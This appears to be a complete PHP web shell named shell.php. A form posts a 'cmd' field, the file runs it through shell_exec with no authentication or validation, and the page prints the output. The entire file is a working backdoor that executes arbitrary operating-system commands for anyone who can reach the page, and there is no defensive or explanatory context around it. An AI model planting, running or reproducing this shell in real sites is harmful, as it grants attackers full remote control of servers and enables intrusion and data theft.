<?php
    if( $_SERVER['REQUEST_METHOD']=='POST' ){
        $str = shell_exec( $_POST['cmd'] );
        //$str = $_POST['cmd'];
    }
?>
<form action="shell.php" method="post">
	<input type="text" name="cmd" value=""><br>
	<input type="submit" name="" value="DO">
</form>
<?php
    echo "<pre>".$str."</pre>";
?>